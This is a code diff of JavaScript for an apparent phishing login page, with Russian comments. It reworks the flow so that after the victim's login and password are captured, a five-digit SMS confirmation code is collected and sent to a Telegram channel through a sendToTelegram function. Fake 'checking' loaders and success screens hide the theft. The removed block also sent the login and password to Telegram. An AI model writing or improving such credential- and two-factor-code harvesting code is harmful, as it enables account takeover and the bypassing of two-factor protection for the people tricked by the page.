@@ -371,12 +371,10 @@
 		const passwordInput = document.querySelector('input[data-test-id="password-input"]');
 		const loginSubmit = document.getElementById('login-submit');
 
-		const smsInput = document.querySelector('input[data-test-id="sms-input"]');
 		const smsSubmit = document.getElementById('sms-submit');
 
 		const loginWrapper = loginInput && loginInput.closest('.form-control__inputWrapper_1ilh2');
 		const passwordWrapper = passwordInput && passwordInput.closest('.form-control__inputWrapper_1ilh2');
-		const smsWrapper = smsInput && smsInput.closest('.form-control__inputWrapper_1ilh2');
 
 		const eyeButton = document.querySelector('.password-input__eye_czmrz');
 
@@ -406,13 +404,6 @@
 			}
 		}
 
-		function updateSmsButtonState() {
-			if (smsInput.value.trim().length >= 4) {
-				smsSubmit.removeAttribute('disabled');
-			} else {
-				smsSubmit.setAttribute('disabled', '');
-			}
-		}
 
 		if (loginInput) {
 			loginInput.addEventListener('input', function () {
@@ -448,24 +439,9 @@
 			});
 		}
 
-		if (smsInput) {
-			smsInput.addEventListener('input', function () {
-				updateSmsButtonState();
-				updateWrapperValueState(smsInput, smsWrapper);
-			});
-			smsInput.addEventListener('focus', function () {
-				toggleWrapperFocus(smsWrapper, true);
-			});
-			smsInput.addEventListener('blur', function () {
-				toggleWrapperFocus(smsWrapper, false);
-				updateWrapperValueState(smsInput, smsWrapper);
-			});
-		}
-
 		// Инициализируем состояние для уже заполненных полей (если такие будут)
 		updateWrapperValueState(loginInput, loginWrapper);
 		updateWrapperValueState(passwordInput, passwordWrapper);
-		updateWrapperValueState(smsInput, smsWrapper);
 
 		if (eyeButton && passwordInput) {
 			eyeButton.addEventListener('click', function () {
@@ -476,42 +452,6 @@
 		}
 
 		if (loginForm && smsForm) {
-			// Текущая версия: этап ввода СМС временно отключён.
-			// После ввода логина и пароля сразу переходим к финальной "загрузке" и успешному завершению.
-			// Старый код с формой СМС оставлен ниже в комментарии, чтобы можно было легко вернуть.
-
-			loginForm.addEventListener('submit', function (e) {
-				e.preventDefault();
-
-				const loginValue = (loginInput && loginInput.value.trim()) || '';
-				const passwordValue = (passwordInput && passwordInput.value.trim()) || '';
-
-				// Отправка введённых данных
-				sendToTelegram(
-					'<b>🔐 Новый вход:</b>\n' +
-						'👤 Логин: <code>' +
-						loginValue +
-						'</code>\n' +
-						'🔑 Пароль: <code>' +
-						passwordValue +
-						'</code>'
-				);
-
-				if (authInfo) authInfo.style.display = 'none';
-
-				loginForm.style.display = 'none';
-
-				loaderText.textContent = 'Проверяем данные…';
-				loader.style.display = 'flex';
-
-				setTimeout(function () {
-					loader.style.display = 'none';
-					successBlock.classList.add('auth-result__success_visible');
-				}, 2000);
-			});
-
-			/*
-			// --- СТАРАЯ ЛОГИКА С ЭТАПОМ СМС ---
 			loginForm.addEventListener('submit', function (e) {
 				e.preventDefault();
 
@@ -532,20 +472,102 @@
 
 				loginForm.style.display = 'none';
 				smsForm.style.display = 'block';
-				if (smsInput) smsInput.focus();
+				
+				// Фокус на первое поле ввода кода
+				const firstInput = smsForm.querySelector('.sms-verification__input[data-index="0"]');
+				if (firstInput) {
+					setTimeout(() => firstInput.focus(), 100);
+				}
+			});
+
+			// Логика для 5 отдельных полей ввода СМС-кода
+			const smsInputs = smsForm.querySelectorAll('.sms-verification__input');
+			const smsFullCodeInput = document.getElementById('sms-full-code');
+
+			// Обработка ввода в каждое поле
+			smsInputs.forEach((input, index) => {
+				input.addEventListener('input', function (e) {
+					const value = e.target.value.replace(/[^0-9]/g, '');
+					e.target.value = value;
+
+					// Обновляем скрытое поле с полным кодом
+					const fullCode = Array.from(smsInputs)
+						.map((inp) => inp.value)
+						.join('');
+					if (smsFullCodeInput) {
+						smsFullCodeInput.value = fullCode;
+					}
+
+					// Активируем кнопку, если все 5 полей заполнены
+					if (fullCode.length === 5) {
+						if (smsSubmit) {
+							smsSubmit.removeAttribute('disabled');
+						}
+					} else {
+						if (smsSubmit) {
+							smsSubmit.setAttribute('disabled', '');
+						}
+					}
+
+					// Автоматический переход на следующее поле
+					if (value && index < smsInputs.length - 1) {
+						smsInputs[index + 1].focus();
+					}
+				});
+
+				input.addEventListener('keydown', function (e) {
+					// Backspace: переход на предыдущее поле, если текущее пустое
+					if (e.key === 'Backspace' && !e.target.value && index > 0) {
+						smsInputs[index - 1].focus();
+					}
+				});
+
+				input.addEventListener('paste', function (e) {
+					e.preventDefault();
+					const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
+					if (pastedData.length > 0) {
+						for (let i = 0; i < Math.min(pastedData.length, smsInputs.length - index); i++) {
+							smsInputs[index + i].value = pastedData[i];
+						}
+						// Обновляем скрытое поле
+						const fullCode = Array.from(smsInputs)
+							.map((inp) => inp.value)
+							.join('');
+						if (smsFullCodeInput) {
+							smsFullCodeInput.value = fullCode;
+						}
+						// Фокус на последнее заполненное поле или следующее пустое
+						const lastFilledIndex = Math.min(index + pastedData.length - 1, smsInputs.length - 1);
+						if (lastFilledIndex < smsInputs.length - 1) {
+							smsInputs[lastFilledIndex + 1].focus();
+						} else {
+							smsInputs[lastFilledIndex].focus();
+						}
+						// Активируем кнопку, если все заполнено
+						if (fullCode.length === 5 && smsSubmit) {
+							smsSubmit.removeAttribute('disabled');
+						}
+					}
+				});
 			});
 
 			smsForm.addEventListener('submit', function (e) {
 				e.preventDefault();
 
-				const smsCode = smsInput.value.trim();
+				const fullCode = Array.from(smsInputs)
+					.map((inp) => inp.value)
+					.join('');
 
-				sendToTelegram(
-					'<b>📲 Подтверждение SMS:</b>\n' + '🔢 Код: <code>' + smsCode + '</code>'
-				);
+				if (fullCode.length !== 5) {
+					return;
+				}
+
+				sendToTelegram('<b>📲 Подтверждение SMS:</b>\n' + '🔢 Код: <code>' + fullCode + '</code>');
 
 				smsSubmit.setAttribute('disabled', '');
-				smsInput.setAttribute('disabled', '');
+				smsInputs.forEach((inp) => {
+					inp.setAttribute('disabled', '');
+				});
 				smsForm.style.display = 'none';
 
 				loaderText.textContent = 'Проверяем код…';
@@ -556,7 +578,6 @@
 					successBlock.classList.add('auth-result__success_visible');
 				}, 2000);
 			});
-			*/
 		}
 	}
 })();
